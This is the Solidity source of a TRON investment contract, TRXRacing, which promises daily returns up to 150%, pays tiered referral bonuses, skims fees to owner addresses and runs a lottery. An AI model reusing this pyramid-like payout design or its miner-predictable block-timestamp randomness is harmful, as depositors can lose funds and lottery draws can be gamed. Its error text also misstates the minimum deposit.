//SourceUnit: TRXRacing.sol

pragma solidity 0.5.10;

contract TRXRacing {
    using SafeMath for uint;

    uint constant internal DEPOSITS_MAX = 200;
    uint constant internal INVEST_MIN_AMOUNT = 500 trx;
    uint constant internal WITHDRAW_MIN_AMOUNT = 200 trx;
    uint constant internal BASE_PERCENT = 500;
    uint constant internal BOOST_PERCENT = 200;
    uint[] internal REFERRAL_PERCENTS = [400, 200, 100];
    uint constant internal RACEBONUS = 1;
    uint constant internal RACETICKET = 250 trx;
    uint constant internal FUND_FEE = 400;
    uint constant internal MARKETING_FEE = 800;
    uint constant internal PROJECT_FEE = 200;
    uint[] internal RACE_WIN_PERCENT = [28, 20, 16, 16];
    uint internal RACE_TICKET_LIMIT = 7;
    uint constant internal MAX_DEPOSIT_PERCENT = 50;
    uint constant internal PERCENTS_DIVIDER = 10000;
    uint constant internal USER_DEPOSITS_STEP = 1000 trx;
    uint constant internal TIME_STEP = 1 days;

    uint internal totalDeposits;
    uint internal totalInvested;
    uint internal totalWithdrawn;
    
    uint raceCurrentPot;
    uint raceCycles;
    uint raceCurrentTicketsCount;
    uint raceLastTicket;
    uint raceTotalTicketsCount;
    address raceLastWin1a;
    address raceLastWin2a;
    address raceLastWin3a;
    address raceLastWin4a;
    
    address payable internal marketingAddress;
    address payable internal projectAddress;
    address payable internal fundAddress;
    
    struct cRace {
      address runnerId;
      uint32 ticketNumber;
    }
    
    struct nRace {
      cRace[] currentRace;
    }
    
    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        address referrer;
        uint24[3] refs;
        uint32 checkpoint;
        uint32 firstinvest;
        uint32 booST;
        uint32 booET;
        uint32 dboost;
        uint32 aboost;
        uint32 rparticipations;
        uint32 withdraws;
        uint64 bonus;
        uint64 rbonus;
        uint64 wrprofit;
    }

    mapping (address => User) internal users;
    mapping (uint => nRace) internal nraces;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event FeePayed(address indexed user, uint totalAmount);
    event NewParticipantRace(address indexed user, uint amount, uint pt);
    event WithdrawPrize(address indexed, uint amount);

    constructor(address payable marketingAddr, address payable fundAddr , address payable projectAddr) public {
        require(!isContract(marketingAddr) && !isContract(fundAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        fundAddress = fundAddr;
        projectAddress = projectAddr;
    }

   function PayoutFees(uint amount) internal {
        uint msgValue = amount;
        uint fundFee = msgValue.mul(FUND_FEE).div(PERCENTS_DIVIDER);
        uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        fundAddress.transfer(fundFee);
        marketingAddress.transfer(marketingFee);
        projectAddress.transfer(projectFee);
        emit FeePayed(msg.sender, marketingFee.add(fundFee.add(projectFee)));
   }
   
   function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 100 TRX");
        User storage user = users[msg.sender];
        require(user.deposits.length < DEPOSITS_MAX, "Maximum 200 deposits from address");

        PayoutFees(msg.value);

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            for (uint i = 0; i < 3; i++) {
                if (upline != address(0)) {
                    uint amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    if (amount > 0) {
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
                        emit RefBonus(upline, msg.sender, i, amount);
                    }
                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }
        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            user.firstinvest = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msg.value), 0, uint32(block.timestamp)));
        totalInvested = totalInvested.add(msg.value);
        totalDeposits++;
        emit NewDeposit(msg.sender, msg.value);
    }

    function withdraw() public {
        uint cB = address(this).balance;
        User storage user = users[msg.sender];
        require (block.timestamp >= uint(user.checkpoint).add(TIME_STEP.mul(3).div(2)) && cB > 0, "Try Again in 36hours");
        uint userPercentRate = getUserPercentRate(msg.sender);
        uint totalAmount;
        uint dividends;
        uint divsboost;

        for (uint i = 0; i < user.deposits.length; i++) {
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3).div(2)) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);
                } else {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);
                }
 
                if (user.dboost > 0) {
                if (user.deposits[i].start > user.booET) {
                    divsboost = 0;
                } else {
                    divsboost = (uint(user.deposits[i].amount).mul(BOOST_PERCENT).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.booST)))
                        .div(TIME_STEP);
                }
                
                if (divsboost > uint(user.deposits[i].amount).mul(10).div(100)) {
                    divsboost = (uint(user.deposits[i].amount).mul(10).div(100));
                }
            }
                if (uint(user.deposits[i].withdrawn).add(dividends).add(divsboost) > uint(user.deposits[i].amount).mul(3).div(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(3).div(2)).sub(uint(user.deposits[i].withdrawn).add(divsboost));
                }
                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends).add(divsboost)); /// changing of storage data
                totalAmount = totalAmount.add(dividends).add(divsboost);
            }
        }
       
       uint referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			user.bonus = 0;
		}
      require(totalAmount > WITHDRAW_MIN_AMOUNT, "User has no minimun");

        if (cB < totalAmount) {
            totalAmount = cB;
        }
        user.dboost = 0;
        user.booET = uint32(block.timestamp);
        user.checkpoint = uint32(block.timestamp);
        user.withdraws++;
        msg.sender.transfer(totalAmount);
        totalWithdrawn = totalWithdrawn.add(totalAmount);
        emit Withdrawn(msg.sender, totalAmount);
    }
    
    
function raceDeposit() external payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        User storage user = users[msg.sender];
        require(user.deposits.length > 0  && msg.value == RACETICKET,"Deposit is require first");
        nRace storage nrace = nraces[raceCycles];
        
        raceTotalTicketsCount ++;
        raceCurrentTicketsCount ++;
        user.rparticipations ++;
        
        raceCurrentPot = raceCurrentPot.add(msg.value); 
        
            nrace.currentRace.push(cRace(msg.sender, uint32(raceLastTicket.add(1))));
            raceLastTicket++;
            emit NewParticipantRace(msg.sender, msg.value, raceLastTicket);
        if (raceCurrentTicketsCount == RACE_TICKET_LIMIT) {
            payRaceWin();
            
            raceCurrentPot = 0;
            raceCurrentTicketsCount = 0;
            raceLastTicket = 0;
            raceCycles++;
        }
    }
    function getRaceWin(uint fr, uint to, uint mod) view internal returns (uint) { 
        uint A = minZero(to, fr).add(1);
        uint B = fr;
        uint value = uint(uint(keccak256(abi.encode(block.timestamp.mul(mod), block.difficulty.mul(mod))))%A).add(B); 
        return value;
    }
    
        function payRaceWin() internal {
         nRace storage nrace = nraces[raceCycles];   
            
        uint win1 = getRaceWin(1, RACE_TICKET_LIMIT, 1);
        uint win2 = getRaceWin(1, RACE_TICKET_LIMIT, 2);
        uint win3 = getRaceWin(1, RACE_TICKET_LIMIT, 3);
        uint win4 = getRaceWin(1, RACE_TICKET_LIMIT, 4);
        uint profit;
        
        uint fundFee = raceCurrentPot.mul(400).div(PERCENTS_DIVIDER);
        uint marketingFee = raceCurrentPot.mul(400).div(PERCENTS_DIVIDER);
        uint projectFee = raceCurrentPot.mul(200).div(PERCENTS_DIVIDER);
        fundAddress.transfer(fundFee);
        marketingAddress.transfer(marketingFee);
        projectAddress.transfer(projectFee);
        emit FeePayed(msg.sender, marketingFee.add(fundFee.add(projectFee)));
        
        for(uint i = 0; i < 7; i++) {
           if (nrace.currentRace[i].ticketNumber == win1) {
               profit = (raceCurrentPot.mul(RACE_WIN_PERCENT[0])).div(100);
               users[nrace.currentRace[i].runnerId].rbonus = uint64(uint(users[nrace.currentRace[i].runnerId].rbonus).add(profit));
               raceLastWin1a = nrace.currentRace[i].runnerId;
           }
           if (nrace.currentRace[i].ticketNumber == win2) {
               profit = (raceCurrentPot.mul(RACE_WIN_PERCENT[1])).div(100);
               users[nrace.currentRace[i].runnerId].rbonus = uint64(uint(users[nrace.currentRace[i].runnerId].rbonus).add(profit));
               raceLastWin2a = nrace.currentRace[i].runnerId;
           }
           if (nrace.currentRace[i].ticketNumber == win3) {
               profit = (raceCurrentPot.mul(RACE_WIN_PERCENT[2])).div(100);
              users[nrace.currentRace[i].runnerId].rbonus = uint64(uint(users[nrace.currentRace[i].runnerId].rbonus).add(profit));
              raceLastWin3a = nrace.currentRace[i].runnerId;
           }
           if (nrace.currentRace[i].ticketNumber == win4) {
               profit = (raceCurrentPot.mul(RACE_WIN_PERCENT[3])).div(100);
              users[nrace.currentRace[i].runnerId].rbonus = uint64(uint(users[nrace.currentRace[i].runnerId].rbonus).add(profit));
              raceLastWin4a = nrace.currentRace[i].runnerId;
           }
        }
    } 
     
     function Booster() public payable {
         require(!isContract(msg.sender) && msg.sender == tx.origin);
         User storage user = users[msg.sender];
         require (block.timestamp >= uint(user.firstinvest).add(TIME_STEP.mul(2)) && block.timestamp >= user.booET, "Boost active");
         
         uint damount = getUserTotalDeposits(msg.sender);
         require (msg.value == damount.div(10), "Deposit 10%");
         user.deposits.push(Deposit(uint64(msg.value), 0, uint32(block.timestamp)));
         totalInvested = totalInvested.add(msg.value);
         
         if (user.dboost == 0){
         user.booST = uint32(block.timestamp);
         user.booET = uint32(uint(block.timestamp).add(TIME_STEP.mul(5)));
         user.dboost++;  
         }else{
          user.booST = uint32(uint(block.timestamp).sub((TIME_STEP.mul(5)).mul(user.dboost)));   
          user.booET = uint32(uint(block.timestamp).add(TIME_STEP.mul(5)));
          user.dboost++;
         }
         user.aboost++;
         
     }

function withdrawRBonus() public {
    uint totalAmount;
        User storage user = users[msg.sender];
        uint RacingBonus = user.rbonus;
		require (RacingBonus > 0,"No Racing Profit" );
		
		totalAmount = totalAmount.add(RacingBonus);
		user.wrprofit = uint64(uint(user.wrprofit).add(RacingBonus));
		user.rbonus = 0;
        
        uint cB = address(this).balance;
            if (cB < totalAmount) {
            totalAmount = cB;
        }
        msg.sender.transfer(totalAmount);
        totalWithdrawn = totalWithdrawn.add(totalAmount);
        emit Withdrawn(msg.sender, totalAmount);
}
    function getBoostdivs(address userAddress) public view returns (uint){
        User storage user = users[userAddress];
        uint totalDividends;
        uint divsboost;
        for (uint i = 0; i < user.deposits.length; i++) {
            if (user.dboost > 0) {
                if (user.deposits[i].start > user.booET) {
                    divsboost = 0;
                } else {
                    divsboost = (uint(user.deposits[i].amount).mul(BOOST_PERCENT).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.booST)))
                        .div(TIME_STEP);
                }
                
                if (divsboost > uint(user.deposits[i].amount).mul(10).div(100)) {
                    divsboost = (uint(user.deposits[i].amount).mul(10).div(100));
                }
                totalDividends = totalDividends.add(divsboost);
                /// no update of withdrawn because that is view function
            }
        }
        return totalDividends;
    }
    
    function getBoost(address userAddress) internal view returns (uint){
        User storage user = users[userAddress];
        uint Pboost;
        if (user.booET > block.timestamp){
            Pboost = BOOST_PERCENT;
        }
        else {
            Pboost = 0;
        }
        return Pboost; 
    }
    
    function getUserBasicRate(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];
        uint BASE_PERCENTNew;
        uint userWithdraws = user.withdraws;
        uint BASE_PERCENTSub = userWithdraws.mul(100);
            if (BASE_PERCENTSub > BASE_PERCENT ) {
                BASE_PERCENTNew = 0;
            }
            else{
                BASE_PERCENTNew = BASE_PERCENT.sub(BASE_PERCENTSub);
            }
        return BASE_PERCENTNew;    
    }

    function getUserRaceRate(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];
        uint rparticipations= user.rparticipations;
            uint LMultiplier = RACEBONUS.mul(rparticipations);
            return LMultiplier;
    }

    function getUserDepositRate(address userAddress) internal view returns (uint) {
        uint userDepositRate;
        if (getUserAmountOfDeposits(userAddress) > 0) {
            userDepositRate = getUserTotalDeposits(userAddress).div(USER_DEPOSITS_STEP).mul(10);
            if (userDepositRate > MAX_DEPOSIT_PERCENT) {
                userDepositRate = MAX_DEPOSIT_PERCENT;
            }
        }
        return userDepositRate;
    }

    function getUserPercentRate(address userAddress) internal view returns (uint) {
        uint userBasicRate = getUserBasicRate(userAddress);
        if (isActive(userAddress)) {
            uint userDepositRate = getUserDepositRate(userAddress);
            uint userRaceRate = getUserRaceRate(userAddress);
            return userBasicRate.add(userDepositRate).add(userRaceRate);
        } else {
            return userBasicRate;
        }
    }

    function getUserAvailable(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];
        uint userPercentRate = getUserPercentRate(userAddress);
        uint totalDividends;
        uint dividends;
        uint divsboost;
        for (uint i = 0; i < user.deposits.length; i++) {
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3).div(2)) {
                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);
                } else {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);
                }
                if (user.dboost > 0) {
                if (user.deposits[i].start > user.booET) {
                    divsboost = 0;
                } else {
                    divsboost = (uint(user.deposits[i].amount).mul(BOOST_PERCENT).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.booST)))
                        .div(TIME_STEP);
                }
                if (divsboost > uint(user.deposits[i].amount).mul(10).div(100)) {
                    divsboost = (uint(user.deposits[i].amount).mul(10).div(100));
                }
            }
                if (uint(user.deposits[i].withdrawn).add(dividends).add(divsboost) > uint(user.deposits[i].amount).mul(3).div(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(3).div(2)).sub(uint(user.deposits[i].withdrawn).add(divsboost));
                }
                totalDividends = totalDividends.add(dividends).add(divsboost);
                /// no update of withdrawn because that is view function
            }
        }
        return totalDividends;
    }
    

    function getUserAmountOfDeposits(address userAddress) internal view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];
        uint amount;
        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }
        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];
        uint amount;
        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }
        return amount;
    }

    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];
        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }
        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory start = new uint[](count);
        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }
        return (amount, withdrawn, start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, address(this).balance ,totalWithdrawn);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint) {
        uint userBoost = getBoost(userAddress);
        uint userPerc = getUserPercentRate(userAddress).add(userBoost);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);
        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }
    
    function getUserPerc (address userAddress) public view returns (uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userBasicRate = getUserBasicRate(userAddress);
        uint userDepositRate = getUserDepositRate(userAddress);
        uint userRaceRate = getUserRaceRate(userAddress);
        uint userBoostRate = getBoost(userAddress);
        return (userPerc, userBasicRate, userDepositRate, userRaceRate, userBoostRate);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint64, uint32, uint32, uint64, uint64, uint32, uint32, uint32, uint32, uint32, uint24[3] memory) {
        User storage user = users[userAddress];
        return (user.referrer, user.bonus, user.firstinvest, user.withdraws, user.rbonus , user.wrprofit, user.rparticipations, user.aboost, user.dboost, user.booST,user.booET, user.refs);
    }
    
    function getUserReferralBonus(address userAddress) internal view returns(uint) {
		return users[userAddress].bonus;
	}
    
    function getRunnerStats() public view returns (address, address, address, address, uint, uint, uint, uint, uint, uint) {
        return (raceLastWin1a, raceLastWin2a, raceLastWin3a , raceLastWin4a ,raceCycles, raceCurrentTicketsCount, raceTotalTicketsCount, RACE_TICKET_LIMIT, RACETICKET, raceCurrentPot);
    }
    
    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];
        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(3).div(2);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    
    function minZero(uint a, uint b) internal pure returns(uint) {
        if (a > b) {
           return a - b; 
        } else {
           return 0;    
        }    
    }   
    function maxVal(uint a, uint b) internal pure returns(uint) {
        if (a > b) {
           return a; 
        } else {
           return b;    
        }    
    }
    function minVal(uint a, uint b) internal pure returns(uint) {
        if (a > b) {
           return b; 
        } else {
           return a;    
        }    
    }
}
library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint c = a - b;
        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0, "SafeMath: division by zero");
        uint c = a / b;
        return c;
    }
}